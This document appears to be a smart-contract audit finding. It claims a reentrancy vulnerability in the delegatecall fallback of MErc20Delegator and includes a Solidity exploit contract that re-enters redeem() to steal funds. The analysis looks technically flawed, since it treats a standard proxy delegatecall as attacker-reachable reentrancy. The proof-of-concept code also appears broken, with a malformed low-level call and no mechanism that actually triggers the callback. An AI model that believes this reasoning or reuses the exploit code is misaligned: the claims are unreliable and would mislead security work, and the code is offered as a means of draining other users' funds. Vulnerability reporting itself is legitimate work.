# Vulnerability details

## Impact
The impact of the reentrancy vulnerability in MErc20Delegator could be severe. An attacker could exploit it to perform actions repeatedly, potentially manipulating internal states, balances, or even stealing funds from other users of the contract. This type of vulnerability can have severe consequences and lead to financial losses.

## Proof of Concept
The fallback function in MErc20Delegator delegates calls to the implementation contract using delegatecall. This creates a reentrancy vulnerability, as the implementation contract can call back into MErc20Delegator before the original delegatecall completes. This could potentially allow an attacker to perform reentrant calls, leading to malicious actions, such as stealing funds or manipulating contract state.

This proof of concept demonstrates how a reentrancy attack could be executed in a vulnerable contract:

// Exploit contract to demonstrate reentrancy
contract ExploitContract {
    MErc20Delegator public target;

    constructor(address _target) {
        target = MErc20Delegator(_target);
    }

    // This function is called after deploying the ExploitContract
    function startReentrantAttack() external payable {
        // Trigger the fallback function of the vulnerable contract
        target.call(bytes4(keccak256("fallback()")));
    }

    // The fallback function in ExploitContract
    fallback() external payable {
        // Perform reentrant call to the target contract's `redeem` function
        target.redeem(100);
    }
}

